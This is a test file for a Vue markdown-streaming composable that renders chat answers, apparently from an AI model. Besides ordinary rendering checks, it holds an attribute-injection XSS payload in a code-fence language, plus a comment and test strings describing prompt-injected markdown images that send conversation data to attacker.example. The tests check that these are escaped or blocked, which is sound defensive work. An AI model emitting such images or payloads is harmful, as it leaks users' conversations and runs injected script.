import { describe, it, expect, vi } from 'vitest';
import { useStreamMarkdown } from '../../src/headless/useStreamMarkdown';

describe('useStreamMarkdown', () => {
  it('should initialize with empty state', () => {
    const { html, rawText, isStreaming } = useStreamMarkdown();
    expect(html.value).toBe('');
    expect(rawText.value).toBe('');
    expect(isStreaming.value).toBe(false);
  });

  it('should render basic markdown after flush', () => {
    const { html, rawText, append, flush } = useStreamMarkdown();
    append('Hello **world**');
    flush();
    expect(rawText.value).toBe('Hello **world**');
    expect(html.value).toContain('<strong>world</strong>');
  });

  it('should accumulate multiple chunks', () => {
    const { html, rawText, append, flush } = useStreamMarkdown();
    append('Hello ');
    append('**world**');
    flush();
    expect(rawText.value).toBe('Hello **world**');
    expect(html.value).toContain('<strong>world</strong>');
  });

  it('should set isStreaming to true on first append', () => {
    const { isStreaming, append } = useStreamMarkdown();
    expect(isStreaming.value).toBe(false);
    append('text');
    expect(isStreaming.value).toBe(true);
  });

  it('should render code blocks with language class', () => {
    const { html, append, finish } = useStreamMarkdown();
    append('```typescript\nconst x = 1;\n```');
    finish();
    // markdown-it renders fenced blocks with language class
    expect(html.value).toContain('language-typescript');
    expect(html.value).toContain('const x = 1;');
  });

  it('escapes the fence language before it reaches the class attribute', () => {
    const { html, append, finish } = useStreamMarkdown();
    // Author-controlled info string with no whitespace, so `split(/\s+/)[0]`
    // keeps the whole payload. The shiki path only sees allow-listed languages;
    // the fallback path used to interpolate this raw into `class="language-…"`.
    append('```js"onmouseover="alert(1)\nx\n```');
    finish();
    expect(html.value).not.toContain('onmouseover="alert(1)"');
    expect(html.value).toContain('language-js&quot;onmouseover=&quot;alert(1)');
  });

  it('should render inline code', () => {
    const { html, append, flush } = useStreamMarkdown();
    append('Use `console.log()` to debug');
    flush();
    expect(html.value).toContain('<code>');
    expect(html.value).toContain('console.log()');
  });

  it('should flush re-renders current content', () => {
    const { html, rawText, append, flush } = useStreamMarkdown();
    append('**bold**');
    flush();
    const firstHtml = html.value;
    flush();
    expect(html.value).toBe(firstHtml);
    expect(rawText.value).toBe('**bold**');
  });

  it('should finish and set isStreaming to false', () => {
    const { isStreaming, html, append, finish } = useStreamMarkdown();
    append('some text');
    expect(isStreaming.value).toBe(true);
    finish();
    expect(isStreaming.value).toBe(false);
    expect(html.value).not.toBe('');
  });

  it('should reset all state', () => {
    const { html, rawText, isStreaming, append, flush, reset } = useStreamMarkdown();
    append('Hello');
    flush();
    expect(rawText.value).toBe('Hello');
    expect(isStreaming.value).toBe(true);

    reset();
    expect(html.value).toBe('');
    expect(rawText.value).toBe('');
    expect(isStreaming.value).toBe(false);
  });

  it('should render headings', () => {
    const { html, append, flush } = useStreamMarkdown();
    append('# Title\n\nParagraph text');
    flush();
    expect(html.value).toContain('<h1>');
    expect(html.value).toContain('Title');
  });

  it('should render links with linkify enabled', () => {
    const { html, append, flush } = useStreamMarkdown();
    append('Visit https://example.com today');
    flush();
    expect(html.value).toContain('<a');
    expect(html.value).toContain('https://example.com');
  });

  it('should render lists', () => {
    const { html, append, flush } = useStreamMarkdown();
    append('- item 1\n- item 2\n- item 3');
    flush();
    expect(html.value).toContain('<ul>');
    expect(html.value).toContain('<li>');
    expect(html.value).toContain('item 1');
  });

  it('should handle empty chunks', () => {
    const { rawText, append } = useStreamMarkdown();
    append('');
    append('hello');
    append('');
    expect(rawText.value).toBe('hello');
  });

  // -------------------------------------------------------------------------
  // Images fetch on render, with no click. A prompt-injected page or document
  // the model reads can make it emit `![](https://attacker/p?d=<conversation>)`
  // and the browser would send the data the moment the answer appears. Only
  // sources that cannot carry data off the page load automatically.
  // -------------------------------------------------------------------------

  function renderOnce(markdown: string, options?: Parameters<typeof useStreamMarkdown>[0]): string {
    const { html, append, finish } = useStreamMarkdown(options);
    append(markdown);
    finish();
    return html.value;
  }

  it.each([
    ['https', '![](https://attacker.example/p.png?d=secret)'],
    ['http', '![chart](http://attacker.example/p.png?d=secret)'],
    ['upper-case scheme', '![](HTTPS://attacker.example/p.png?d=secret)'],
    ['protocol-relative', '![](//attacker.example/p.png?d=secret)'],
    ['reference style', '![logo][ref]\n\n[ref]: https://attacker.example/p.png?d=secret'],
  ])('does not auto-load a remote image (%s)', (_label, markdown) => {
    const html = renderOnce(markdown);
    expect(html).not.toContain('<img');
    expect(html.toLowerCase()).toContain('attacker.example/p.png?d=secret');
  });

  it('turns a remote image into a link the user can choose to follow', () => {
    const html = renderOnce('![quarterly chart](https://attacker.example/p.png?d=secret)');
    expect(html).toMatch(/<a [^>]*href="https:\/\/attacker\.example\/p\.png\?d=secret"/);
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain('>quarterly chart</a>');
  });

  it('escapes the alt text of a remote image', () => {
    const html = renderOnce('![a "b" <c>](https://attacker.example/p.png)');
    expect(html).not.toContain('<c>');
    expect(html).toContain('>a &quot;b&quot; &lt;c&gt;</a>');
  });

  it('still renders same-origin and inline images', () => {
    expect(renderOnce('![a](/api/files/1/preview)')).toContain('<img src="/api/files/1/preview" alt="a">');
    expect(renderOnce(`![b](${window.location.origin}/img/b.png)`)).toContain('<img');
    expect(renderOnce('![c](data:image/png;base64,iVBORw0KGgo=)')).toContain('<img');
  });

  it('applies the same image rule when raw HTML is allowed', () => {
    const html = renderOnce('![](https://attacker.example/p.png?d=secret)', { allowHtml: true });
    expect(html).not.toContain('<img');
  });

  // -------------------------------------------------------------------------
  // A source the answer cites must not replace the conversation: a link to
  // another site opens in a new tab, a link within this origin stays in place.
  // -------------------------------------------------------------------------

  /** The attributes of every rendered `<a>`, read back through the DOM. */
  function anchors(html: string): Array<{ href: string | null; target: string | null; rel: string | null }> {
    const host = document.createElement('div');
    host.innerHTML = html;
    return Array.from(host.querySelectorAll('a'), (a) => ({
      href: a.getAttribute('href'),
      target: a.getAttribute('target'),
      rel: a.getAttribute('rel'),
    }));
  }

  it.each([
    ['a markdown link', '[Deep Linking | Tauri](https://v2.tauri.app/plugin/deep-linking/)'],
    ['a source list item', 'Sources:\n- [Tauri](https://v2.tauri.app/start/)\n- [MDN](http://developer.mozilla.org/)'],
    ['a bare URL (linkify)', 'See https://v2.tauri.app/start/ for more.'],
    ['an upper-case scheme', '[x](HTTPS://v2.tauri.app/)'],
    ['a protocol-relative address', '[x](//v2.tauri.app/)'],
    ['a reference link', '[docs][ref]\n\n[ref]: https://v2.tauri.app/'],
  ])('opens a link to another site in a new tab (%s)', (_label, markdown) => {
    const links = anchors(renderOnce(markdown));
    expect(links.length).toBeGreaterThan(0);
    for (const link of links) {
      expect(link.target).toBe('_blank');
      expect(link.rel).toBe('noopener noreferrer');
    }
  });

  it.each([
    ['a site-relative path', '[file](/files/report.pdf)'],
    ['this origin, written out', `[home](${window.location.origin}/threads/1)`],
    ['an anchor on the page', '[top](#top)'],
    ['a mail address', '[mail](mailto:team@example.com)'],
  ])('leaves a link that does not leave the site in place (%s)', (_label, markdown) => {
    const [link] = anchors(renderOnce(markdown));
    expect(link?.href).toBeTruthy();
    expect(link?.target).toBeNull();
    expect(link?.rel).toBeNull();
  });

  it('applies the same link rule when raw HTML is allowed', () => {
    const [link] = anchors(renderOnce('[x](https://v2.tauri.app/)', { allowHtml: true }));
    expect(link?.target).toBe('_blank');
  });

  it('writes the code block copy button in the labels it is given, escaped', () => {
    const { html, append, finish } = useStreamMarkdown({ labels: { copy: '<复制>', copyCode: '复制 "代码"' } });
    append(['```js', 'x', '```'].join('\n'));
    finish();
    // Icon-only button: its name (escaped) is the accessible label and the tooltip.
    expect(html.value).toContain('aria-label="复制 &quot;代码&quot;" title="复制 &quot;代码&quot;"');
    expect(html.value).not.toContain('复制>');
  });

  it('re-renders when the labels change (the interface language switched)', async () => {
    const { ref, nextTick } = await import('vue');
    const labels = ref({ copy: '复制', copyCode: '复制代码' });
    const { html, append, finish } = useStreamMarkdown({ labels });
    append(['```js', 'x', '```'].join('\n'));
    finish();
    expect(html.value).toContain('aria-label="复制代码"');
    labels.value = { copy: 'Copy', copyCode: 'Copy code' };
    await nextTick();
    expect(html.value).toContain('aria-label="Copy code" title="Copy code"');
  });

  it('still re-renders when the text changes, and when flush is asked for explicitly', async () => {
    const MarkdownIt = (await import('markdown-it')).default;
    const md = new MarkdownIt();
    const render = vi.spyOn(md, 'render');
    const { append, finish, flush } = useStreamMarkdown({ markdownIt: md });
    append('one');
    finish();
    append(' two');
    finish();
    flush();
    expect(render.mock.calls.map(([source]) => source)).toEqual(['one', 'one two', 'one two']);
  });

  it('should support custom markdown-it instance', async () => {
    const MarkdownIt = (await import('markdown-it')).default;
    const customMd = new MarkdownIt({ html: false });
    const { html, append, flush } = useStreamMarkdown({ markdownIt: customMd });
    append('<div>raw html</div>');
    flush();
    // With html:false, the tag should be escaped
    expect(html.value).not.toContain('<div>raw html</div>');
  });
});
